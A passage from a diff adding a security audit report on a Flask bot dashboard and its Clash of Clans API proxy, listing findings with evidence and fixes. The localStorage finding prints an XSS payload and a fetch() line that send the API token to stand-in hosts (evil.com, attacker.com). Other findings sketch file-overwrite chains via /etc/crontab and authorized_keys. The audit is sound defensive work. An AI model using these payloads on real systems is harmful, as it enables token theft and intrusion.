+  exploits CSRF — HIGH-002) can:
+
+  1. Write malicious YAML to config.yaml that causes unintended bot behavior
+     (change device serial, disable dry_run, set max_attacks to 999999, etc.).
+  2. If config_path was set to a sensitive path (see MED-004), overwrite system
+     files with YAML-formatted content.
+  3. The YAML is parsed with yaml.safe_load() which prevents code execution
+     via YAML deserialization, so direct RCE via YAML is not possible — but
+     the file write itself is the critical primitive.
+
+  Combined with MED-004 (config_path set to ../../../home/user/.ssh/authorized_keys
+  via the --config CLI argument), the POST endpoint becomes an arbitrary file
+  write at any path. Even without MED-004, overwriting config.yaml with
+  crafted values that redirect log_file to /etc/crontab (world-writable on
+  some systems) could achieve code execution via log injection.
+
+Evidence:
+  web/app.py:208-228
+    @app.route("/api/config", methods=["POST"])
+    @login_required
+    def api_config_save():
+        global bot
+        try:
+            new_config_text = request.json.get("config", "")
+            yaml.safe_load(new_config_text)         # only validates YAML syntax
+            with open(config_path, "w") as f:
+                f.write(new_config_text)            # writes arbitrary content
+            if not bot.running:
+                config = load_config(config_path)
+                bot = Bot(config)                   # reloads into live bot
+
+Impact:
+  Authenticated write of arbitrary content to config_path. If config_path
+  points outside the project directory (MED-004), this is a full arbitrary
+  file write primitive. Even within the project directory, overwriting
+  config.yaml can change the ADB serial and redirect bot actions to a
+  different device, disable safety limits, or cause log files to be written
+  to sensitive paths.
+
+Remediation:
+  1. Resolve and jail config_path to the project root (see MED-004 remediation).
+  2. After YAML validation, validate the parsed config against a strict schema
+     (e.g., using pydantic or jsonschema) before writing. Reject unknown keys
+     or values that don't match expected types/ranges.
+  3. Write to a temporary file and rename atomically:
+       import tempfile, shutil
+       with tempfile.NamedTemporaryFile('w', dir=project_root, delete=False) as tmp:
+           tmp.write(new_config_text)
+       shutil.move(tmp.name, config_path)
+  4. Add CSRF protection (HIGH-002 remediation) to prevent unauthenticated use.
+
+References:
+  CWE-22: Path Traversal
+  CWE-434: Unrestricted Upload of File with Dangerous Type
+  OWASP A01:2021 - Broken Access Control
+
+Status: FIXED
+Fixed Date: 2026-03-21
+Remediation: Added _is_config_path_safe() helper that resolves config_path and verifies
+  it stays within the project root directory. Both /api/config GET and POST now return
+  403 if the path escapes the project root.
+
+---
+
+================================================================================
+ADDENDUM — CoC API PROXY FEATURE AUDIT
+Audit Date: 2026-03-21
+Scope: /api/coc/proxy endpoint (web/app.py:376-421) and CoC API Explorer UI
+       (web/templates/index.html — page-api div and associated JavaScript)
+================================================================================
+
+[PROXY-INFO-001] syntaxHL RESPONSE RENDERER IS NOT EXPLOITABLE FOR XSS
+Severity:    INFORMATIONAL
+File(s):     web/templates/index.html (lines 716-727)
+Category:    XSS / Secure Design
+
+Description:
+  The syntaxHL() function renders JSON API responses via innerHTML. A naive
+  reading suggests an XSS risk, but the implementation is safe: it calls
+  escH() (which HTML-encodes &, <, >) on the full JSON string BEFORE the
+  regex replacement runs. All span class attributes are hardcoded static
+  strings ('json-num', 'json-key', 'json-str', 'json-bool', 'json-null').
+  No attacker-controlled string reaches an unescaped HTML context.
+
+Evidence:
+  index.html:716-727
+    function syntaxHL(json) {
+        return escH(JSON.stringify(json, null, 2)).replace(
+            /("(\\u[...]*"(\s*:)?|...)/g,
+            m => {
+                let c = 'json-num';  // always a static literal
+                ...
+                return `<span class="${c}">${m}</span>`;
+                // m is already HTML-escaped by escH() above
+            }
+        );
+    }
+
+Impact:
+  None — the function is secure as implemented.
+
+Remediation:
+  No action required. Document the escaping guarantee in a code comment to
+  prevent future refactoring from accidentally removing the escH() call.
+
+References:
+  CWE-79: XSS (confirmed not present here)
+
+---
+
+[PROXY-INFO-002] API TOKEN SENT TO SERVER ON EVERY REQUEST (ARCHITECTURAL NOTE)
+Severity:    INFORMATIONAL
+File(s):     web/templates/index.html (lines 679-683), web/app.py (lines 385-386)
+Category:    Credential Handling / Design
+
+Description:
+  The described intent of the proxy is that "the key stays server-side"
+  (comment at line 379). However, the token is actually sent from the
+  browser to the proxy server in the POST request body on every API call
+  rather than being stored server-side. The server does not persist the
+  token — it is submitted by the client with each request. This means the
+  token passes through the network on every request, not just once. The
+  only benefit over a purely client-side call is that the CoC API origin
+  restriction (tokens are IP-locked in the developer portal) is satisfied
+  by the server's IP.
+
+Evidence:
+  index.html:679-683
+    body: JSON.stringify({ token, method: currentEp.method, path, ... })
+    // token is submitted from the browser to the Flask proxy on every call
+
+  app.py:385-386
+    data = request.json or {}
+    token = data.get("token", "").strip()  // extracted from body each time
+
+Impact:
+  The token is in transit on every request. Under the existing no-TLS
+  condition (HIGH-001), this means the API token travels in plaintext on
+  the network for every API call made, not just at setup time.
+  Severity is informational here because the root cause is HIGH-001 (no TLS).
+
+Remediation:
+  If the intent is truly to keep the key server-side, consider storing it
+  in the server session or a server-side config field so it is transmitted
+  only once (at save time). The /api/coc/proxy could then read from
+  session["coc_token"] rather than from the request body each time.
+
+References:
+  CWE-319: Cleartext Transmission of Sensitive Information (see HIGH-001)
+
+---
+
+[PROXY-LOW-001] NO HTTP METHOD ALLOWLIST ON PROXY ENDPOINT
+Severity:    LOW
+File(s):     web/app.py (lines 387, 402)
+Category:    Input Validation / Injection Precursor
+
+Description:
+  The proxy accepts any string as the HTTP method (only .upper() is applied).
+  The method is passed directly to urllib.request.Request(). There is no
+  allowlist restricting to GET and POST (the only methods the CoC API
+  supports). An authenticated user can submit DELETE, PUT, PATCH, HEAD,
+  OPTIONS, TRACE, or any custom string as the method value.
+
+Evidence:
+  app.py:387
+    method = data.get("method", "GET").upper()
+
+  app.py:402
+    req = _ureq.Request(url, data=body_bytes, method=method)
+    # method is attacker-controlled with no allowlist
+
+Impact:
+  An authenticated user can send DELETE/PUT/PATCH requests to the CoC API
+  endpoints. While the CoC API would likely return 405 Method Not Allowed,
+  sending unexpected methods to a third-party API on behalf of the server
+  is unexpected behavior and could violate the API's terms of service.
+  If future code changes use the method string in other contexts (e.g.,
+  logging, routing logic), an unsanitized method value becomes a higher
+  risk. With methods like TRACE or CONNECT, some network intermediaries
+  behave unexpectedly.
+
+Remediation:
+  Restrict the method to an explicit allowlist:
+    ALLOWED_METHODS = {"GET", "POST"}
+    method = data.get("method", "GET").upper()
+    if method not in ALLOWED_METHODS:
+        return jsonify({"error": "Method not allowed"}), 400
+
+References:
+  CWE-20: Improper Input Validation
+  CWE-749: Exposed Dangerous Method or Function
+
+---
+
+[PROXY-LOW-002] VERBOSE EXCEPTION MESSAGES DISCLOSE INTERNAL NETWORK DETAILS
+Severity:    LOW
+File(s):     web/app.py (lines 420-421)
+Category:    Information Disclosure (CWE-209)
+
+Description:
+  The final exception handler in coc_proxy catches all non-HTTP errors
+  (network timeouts, DNS failures, connection refused, SSL errors) and
+  returns str(e) directly to the client. Python's urllib and socket
+  exception messages often include the target hostname, port, local socket
+  address, errno values, and OS-level error descriptions. While the target
+  is always api.clashofclans.com (hardcoded), the error messages can
+  reveal details about the server's network configuration.
+
+Evidence:
+  app.py:420-421
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+  Example error strings urllib can produce:
+    "[Errno 8] nodename nor servname provided, or not known"
+    "<urlopen error timed out>"
+    "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: ..."
+    "Remote end closed connection without response"
+
+Impact:
+  An authenticated user can learn about the server's network topology,
+  DNS resolution behavior, and SSL/TLS configuration by triggering
+  error conditions. For example, submitting a path that causes a
+  timeout reveals the server's timeout value (10 seconds). SSL errors
+  reveal the Python version and OpenSSL version in some error messages.
+  On its own this is low severity, but it aids reconnaissance.
+
+Remediation:
+  Log the full exception server-side and return a generic error to the
+  client:
+    except Exception as e:
+        logger.error("CoC proxy request failed: %s", e)
+        return jsonify({"error": "Request to CoC API failed"}), 500
+
+References:
+  CWE-209: Generation of Error Message Containing Sensitive Information
+  OWASP A05:2021 - Security Misconfiguration
+
+---
+
+[PROXY-LOW-003] NO RATE LIMITING ON PROXY ENDPOINT — API KEY EXHAUSTION RISK
+Severity:    LOW
+File(s):     web/app.py (lines 376-421)
+Category:    Rate Limiting / Denial of Service (CWE-400)
+
+Description:
+  The /api/coc/proxy endpoint has no per-user or per-IP request rate limit.
+  The CoC developer API enforces rate limits on the API key itself (not per
+  caller). An authenticated user (or a CSRF-forged request exploiting
+  HIGH-002) can send requests in a tight loop, exhausting the API key's
+  daily or per-second rate limit, causing all legitimate API calls to fail
+  with HTTP 429 responses. Additionally, each proxy call ties up a server
+  thread for up to 10 seconds (the urllib timeout), which combined with
+  the single-threaded Werkzeug server (INFO-001) can cause a denial of
+  service against the entire dashboard.
+
+Evidence:
+  app.py:376 — no Flask-Limiter decorator or manual rate-check:
+    @app.route("/api/coc/proxy", methods=["POST"])
+    @login_required
+    def coc_proxy():
+
+  app.py:410 — 10-second timeout per request:
+    with _ureq.urlopen(req, timeout=10) as resp:
+
+  The single-threaded Werkzeug server processes one request at a time;
+  a flood of 10-second proxy calls blocks all other requests.
+
+Impact:
+  - CoC API key rate limit exhaustion, disrupting legitimate API usage.
+  - Dashboard DoS: legitimate dashboard users (bot control, screenshots,
+    config) are blocked while proxy requests are in flight.
+
+Remediation:
+  Add rate limiting via Flask-Limiter:
+    from flask_limiter import Limiter, util
+    limiter = Limiter(app, key_func=util.get_remote_address)
+
+    @app.route("/api/coc/proxy", methods=["POST"])
+    @login_required
+    @limiter.limit("30 per minute")
+    def coc_proxy():
+        ...
+
+  Also consider reducing the urllib timeout to 5 seconds and deploying
+  behind gunicorn (see INFO-001).
+
+References:
+  CWE-400: Uncontrolled Resource Consumption
+  CWE-770: Allocation of Resources Without Limits or Throttling
+
+---
+
+[PROXY-MED-001] API TOKEN STORED IN localStorage — PERSISTENT XSS EXFILTRATION TARGET
+Severity:    MEDIUM
+File(s):     web/templates/index.html (lines 729-737, 741-742)
+Category:    Sensitive Data Exposure / XSS (CWE-312, CWE-79)
+
+Description:
+  The CoC API key is saved to and loaded from browser localStorage under
+  the key 'coc_api_key'. localStorage is persistent (survives browser
+  restarts), is shared across all tabs of the same origin, and is fully
+  readable by any JavaScript executing in that origin — including via XSS.
+  The existing LOW-005 finding (innerHTML injection via strategy names
+  rendered from the server) provides a viable XSS vector from an
+  authenticated write to config.yaml. If that XSS fires, the attacker's
+  payload can trivially steal the CoC API token:
+    fetch('https://attacker.com/?k=' + localStorage.getItem('coc_api_key'))
+
+  The CoC developer API issues per-IP-restricted tokens, but an attacker
+  who steals the token and then allowlists their own IP at the developer
+  portal can use the token indefinitely. The token also allows querying
+  private clan data and war information the token owner has access to.
+
+Evidence:
+  index.html:729-737
+    function saveApiKey() {
+        const k = document.getElementById('api-key-input').value.trim();
+        if (k) {
+            localStorage.setItem('coc_api_key', k);  // stored persistently
+        }
+    }
+
+  index.html:741-742
+    const savedKey = localStorage.getItem('coc_api_key');  // loaded on every page load
+    if (savedKey) document.getElementById('api-key-input').value = savedKey;
+
+  XSS path (from LOW-005 / MED-001):
+    An attacker with authenticated access (or CSRF from HIGH-002) writes a
+    troop name or strategy name containing:
+      <img src=x onerror="fetch('//evil.com/?t='+localStorage.getItem('coc_api_key'))">
+    When rendered via innerHTML in updateHistory() or loadStrategies(),
+    this fires and exfiltrates the token.
+
+Impact:
+  Loss of the CoC API developer token. The token can be used to scrape
+  game data, enumerate clan/player details, and is associated with the
+  owner's developer account. Token theft requires an existing XSS
+  vulnerability (chained with LOW-005 or MED-001) — hence Medium rather
+  than High severity.
+
+Remediation:
+  1. Do not persist the API token in localStorage. Use sessionStorage
+     instead, which is scoped to a single tab and cleared when the tab
+     is closed:
+       sessionStorage.setItem('coc_api_key', k);
+       const savedKey = sessionStorage.getItem('coc_api_key');
+  2. Better: store the token server-side in the Flask session (transmitted
+     once over TLS after HIGH-001 is fixed) and never send it back to the
+     browser. The proxy reads it from session["coc_token"].
+  3. Remediate the XSS vectors identified in LOW-005 and MED-001
+     (use textContent / DOM APIs instead of innerHTML).
+
+References:
+  CWE-312: Cleartext Storage of Sensitive Information
+  CWE-79: Improper Neutralization of Input During Web Page Generation
+  OWASP A02:2021 - Cryptographic Failures
+
+---
+
+[PROXY-MED-002] PARTIAL SSRF — PATH PARAMETER NOT CONFINED TO SAFE CHARACTERS
+Severity:    MEDIUM
+File(s):     web/app.py (lines 395-399)
+Category:    SSRF / Input Validation (CWE-918)
+
+Description:
+  The proxy validates that the path parameter starts with '/' but performs
+  no further sanitization. The constructed URL is:
+
+    url = "https://api.clashofclans.com/v1" + path
+
+  Because urllib.request does not follow HTTP redirects to different hosts
+  by default and the base hostname is hardcoded, a full cross-host SSRF is
+  not achievable via the path parameter alone. However, two partial
+  concerns exist:
+
+  1. PROTOCOL-RELATIVE / FRAGMENT CONFUSION: A path containing a '#'
+     character (e.g., "/#@evil.com/endpoint") is sent to the CoC API
+     server, not to evil.com. However, some URL parsing libraries in
+     middleware or logging stacks may parse the fragment differently.
+
+  2. PARAMETER INJECTION VIA PATH: A path like
+     "/clans?extraParam=injected&realParam" bypasses the params dict
+     construction and directly injects query string content before the
+     legitimate params are appended (via urlencode). This allows an
+     authenticated user to inject arbitrary query parameters to the CoC API
+     that are not in the hardcoded endpoint definitions in the UI.
+
+  3. PATH TRAVERSAL TO COC API ENDPOINTS NOT IN THE UI: The UI restricts
+     which CoC endpoints are shown, but the proxy accepts any path
+     starting with '/'. An authenticated user can call any CoC API endpoint
+     (including undocumented or private ones) by directly POSTing to
+     /api/coc/proxy with an arbitrary path.
+
+Evidence:
+  app.py:395-399
+    if not path.startswith("/"):
+        return jsonify({"error": "Invalid path"}), 400
+    url = "https://api.clashofclans.com/v1" + path
+    if params:
+        url += "?" + _uparse.urlencode(params)
+    # path="/clans?limit=1000" produces:
+    # https://api.clashofclans.com/v1/clans?limit=1000&<other_params>
+
+Impact:
+  - Bypass of the UI's curated endpoint list: any CoC API path is reachable.
+  - Parameter injection via path string: injects unvalidated query parameters
+    before the urlencode-constructed params, potentially affecting CoC API
+    behavior or bypassing frontend field validation.
+  - Full cross-origin SSRF to non-CoC hosts is NOT achievable because the
+    base URL is hardcoded and urllib does not redirect to other protocols
+    based on the path segment. Severity is Medium rather than Critical/High.
+
+Remediation:
+  1. Validate the path against an allowlist of known CoC API path prefixes:
+       ALLOWED_PATHS = {'/clans', '/players', '/leagues', '/locations',
+                        '/labels', '/goldpass', '/clanwarleagues',
+                        '/builderbaseleagues', '/warleagues'}
+       if not any(path.startswith(p) for p in ALLOWED_PATHS):
+           return jsonify({"error": "Path not allowed"}), 400
+  2. Strip any query string components from the path before concatenation:
+       from urllib.parse import urlsplit
+       parsed = urlsplit(path)
+       safe_path = parsed.path  # drops ?query and #fragment
+       if not safe_path.startswith("/"):
+           return jsonify({"error": "Invalid path"}), 400
+       url = "https://api.clashofclans.com/v1" + safe_path
+
+References:
+  CWE-918: Server-Side Request Forgery (SSRF) — partial
+  CWE-20: Improper Input Validation
+  OWASP A10:2021 - Server-Side Request Forgery
+
+---
+
+================================================================================
+REMEDIATION PRIORITY MATRIX
+================================================================================
+
+Priority | Finding           | Title                                              | Effort  | Risk if Unpatched
+---------|-------------------|----------------------------------------------------|---------|------------------
+1        | CRIT-001 (FIXED)  | Hardcoded fallback Flask SECRET_KEY                | Done    | Auth bypass — full dashboard access without credentials
+2        | HIGH-002          | No CSRF protection on any state-changing API       | Medium  | Drive-by bot control, config overwrite from any website
+3        | HIGH-004          | Path traversal in strategy name (file write)       | Low     | Arbitrary file write, potential persistent code execution
+4        | CRIT-003 (FIXED)  | Arbitrary file write via /api/config POST          | Done    | Config/system file overwrite, chained to RCE via log redirect
+5        | HIGH-001          | No TLS — all traffic in plaintext                  | Medium  | Credential and session token interception on the network
+6        | PROXY-MED-001     | CoC API key stored in localStorage                 | Low     | Token exfiltration via any XSS in the dashboard
+7        | PROXY-MED-002     | Path parameter not confined — parameter injection  | Low     | Arbitrary CoC API endpoint access, query string injection
+
+Quick wins (can be done in minutes):
+  - CRIT-001 (FIXED): Random secret generated at startup via secrets.token_hex(32).
+  - CRIT-002 (FIXED): Integer casting + range check on x/y in /api/strategy/tap.
+  - CRIT-003 (FIXED): _is_config_path_safe() jails config path to project root.
+  - PROXY-LOW-001: Add a 2-line ALLOWED_METHODS check in coc_proxy().
+  - PROXY-LOW-002: Replace str(e) with a generic error string; log internally.
+  - PROXY-MED-001: Replace localStorage with sessionStorage (one word change).
+  - PROXY-MED-002: Strip query string from path before URL construction.
+  - MED-002: Add three lines of session cookie config to app initialization.
+
+================================================================================
+END OF REPORT
+================================================================================
